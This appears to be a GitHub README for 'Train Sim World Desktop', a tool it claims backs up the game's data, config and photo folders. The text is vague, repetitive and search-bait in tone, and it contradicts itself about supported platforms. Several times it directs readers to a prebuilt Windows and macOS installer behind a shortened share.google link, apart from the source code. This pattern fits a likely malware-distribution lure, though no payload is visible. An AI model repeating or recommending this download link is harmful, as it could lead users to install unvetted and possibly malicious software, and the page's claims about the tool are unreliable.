![Train Sim World Desktop](assets/hero.png)

# Train Sim World Desktop

*Keep the Train Sim World data folder tidy before an update.*

## What Train Sim World Desktop is

**Train Sim World Desktop** is a Windows utility. A local helper for Train Sim World data folders, config and export files, and photo albums on Windows and macOS.

Train Sim World drops data files next to launcher caches.

Use it when you want the change on this machine without opening a dozen Settings pages.

## Editions

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Finds the Train Sim World data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

People search Train Sim World desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/stellacarter23/train-sim-world-desktop

MIT license. See `LICENSE`.
